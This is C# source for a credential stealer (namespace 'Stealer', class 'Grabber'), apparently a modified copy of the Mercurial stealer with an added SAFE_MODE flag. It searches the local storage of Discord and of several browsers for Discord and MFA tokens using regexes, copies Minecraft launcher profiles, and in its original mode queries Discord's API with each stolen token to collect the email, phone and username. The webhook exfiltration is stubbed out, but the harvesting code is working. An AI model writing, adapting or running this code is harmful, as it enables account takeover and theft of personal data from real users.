using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;

namespace Stealer
{
    class Grabber
    {
        public static List<string> target = new List<string>();

        private static void Scan()
        {
            string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            target.Add(roaming + "\\Discord");
            target.Add(roaming + "\\discordcanary");
            target.Add(roaming + "\\discordptb");
            target.Add(roaming + "\\Opera Software\\Opera Stable");
            target.Add(local + "\\Google\\Chrome\\User Data\\Default");
            target.Add(local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default");
            target.Add(local + "\\Yandex\\YandexBrowser\\User Data\\Default");
        }

        public static List<string> Grab()
        {
            Scan();
            List<string> tokens = new List<string>();
            
            foreach (string x in target)
            {
                if (Directory.Exists(x))
                {
                    string path = x + "\\Local Storage\\leveldb";
                    if (!Directory.Exists(path)) continue;
                    
                    try
                    {
                        DirectoryInfo leveldb = new DirectoryInfo(path);
                        foreach (var file in leveldb.GetFiles("*.log"))
                        {
                            try
                            {
                                string contents = File.ReadAllText(file.FullName);
                                
                                // Match Discord tokens (pattern 1)
                                foreach (Match match in Regex.Matches(contents, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                                {
                                    if (!tokens.Contains(match.Value))
                                        tokens.Add(match.Value);
                                }
                                
                                // Match MFA tokens (pattern 2)
                                foreach (Match match in Regex.Matches(contents, @"mfa\.[\w-]{84}"))
                                {
                                    if (!tokens.Contains(match.Value))
                                        tokens.Add(match.Value);
                                }
                            }
                            catch { /* Skip unreadable files */ }
                        }
                    }
                    catch { /* Skip inaccessible directories */ }
                }
            }

            // ===== SAFE MODE: Save tokens locally, no network calls =====
            if (Program.SAFE_MODE)
            {
                string logDir = @"C:\Mercurial_Safe";
                if (!Directory.Exists(logDir))
                    Directory.CreateDirectory(logDir);

                string logPath = Path.Combine(logDir, "Discord_Tokens.txt");
                
                // Write all tokens to file
                File.WriteAllLines(logPath, tokens);
                Console.WriteLine("[DAVE] SAFE MODE: Found " + tokens.Count + " Discord tokens. Saved to: " + logPath);
                
                // Log each token preview to console (first 10 chars only)
                foreach (string token in tokens)
                {
                    string preview = token.Length > 10 ? token.Substring(0, 10) + "..." : token;
                    Console.WriteLine("[DAVE] Token found: " + preview);
                }
                
                return tokens; // Return without validating/sending
            }

            // ===== ORIGINAL MODE: Validate and send Discord tokens =====
            foreach (string token in tokens)
            {
                try
                {
                    Token t = new Token(token);
                    // The Token constructor automatically validates and sends
                }
                catch
                {
                    // Silent fail
                }
            }

            return tokens;
        }

        public static void Minecraft()
        {
            string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string targetPath = roaming + "\\.minecraft\\launcher_profiles.json";
            Console.WriteLine("[DAVE] Minecraft profile path: " + targetPath);
            
            if (File.Exists(targetPath))
            {
                Console.WriteLine("[DAVE] Minecraft profile found at: " + targetPath);
                
                if (Program.SAFE_MODE)
                {
                    // SAFE MODE: Copy the file to Mercurial_Safe folder
                    string logDir = @"C:\Mercurial_Safe";
                    if (!Directory.Exists(logDir))
                        Directory.CreateDirectory(logDir);
                    
                    string destPath = Path.Combine(logDir, "Minecraft_Profile.json");
                    try
                    {
                        File.Copy(targetPath, destPath, true);
                        Console.WriteLine("[DAVE] SAFE MODE: Minecraft profile copied to: " + destPath);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[DAVE] Error copying Minecraft profile: " + ex.Message);
                    }
                }
                else
                {
                    // ORIGINAL MODE: Read and send Minecraft session data
                    try
                    {
                        string contents = File.ReadAllText(targetPath);
                        // The original code would send this via webhook
                        // For now, we just log that it would be sent
                        Console.WriteLine("[DAVE] ORIGINAL MODE: Minecraft profile would be sent.");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[DAVE] Error reading Minecraft profile: " + ex.Message);
                    }
                }
            }
            else
            {
                Console.WriteLine("[DAVE] No Minecraft profile found.");
            }
        }
    }

    // Token class — modified to respect SAFE_MODE
    class Token
    {
        private string token;
        private string jsonResponse = String.Empty;

        public string fullUsername;
        public string userId;
        public string avatarUrl;
        public string phoneNumber;
        public string email;
        public string locale;
        public string creationDate;

        public Token(string inToken)
        {
            token = inToken;
            
            // If SAFE_MODE is enabled, do NOT make network calls
            if (Program.SAFE_MODE)
            {
                Console.WriteLine("[DAVE] SAFE MODE: Token validation skipped for: " + 
                    (token.Length > 10 ? token.Substring(0, 10) + "..." : token));
                
                // Set dummy data
                fullUsername = "SAFE_MODE_DISABLED";
                userId = "000000";
                avatarUrl = "https://cdn.discordapp.com/avatars/000000/";
                phoneNumber = "N/A";
                email = "disabled@safe.mode";
                locale = "en-US";
                creationDate = DateTime.Now.ToString();
                return;
            }

            // ORIGINAL CODE — only runs when SAFE_MODE = false
            PostToken();
        }

        private void PostToken()
        {
            try
            {
                using (System.Net.Http.HttpClient client = new System.Net.Http.HttpClient())
                {
                    client.DefaultRequestHeaders.Add("Authorization", token);
                    var response = client.GetAsync("https://discordapp.com/api/v8/users/@me");
                    var final = response.Result.Content.ReadAsStringAsync();
                    jsonResponse = final.Result;
                }
                GetData();
            }
            catch
            {
            }
        }

        private void GetData()
        {
            string username = Common.Extract("username", jsonResponse);
            userId = Common.Extract("id", jsonResponse);
            string discriminator = Common.Extract("discriminator", jsonResponse);
            fullUsername = username + "#" + discriminator;

            string avatarId = Common.Extract("avatar", jsonResponse);
            avatarUrl = "https://cdn.discordapp.com/avatars/" + userId + "/" + avatarId;

            phoneNumber = Common.Extract("phone", jsonResponse);
            email = Common.Extract("email", jsonResponse);

            locale = Common.Extract("locale", jsonResponse);

            long creation = (Convert.ToInt64(userId) >> 22) + 1420070400000;
            var result = DateTimeOffset.FromUnixTimeMilliseconds(creation).DateTime;
            creationDate = result.ToString();
        }
    }
}
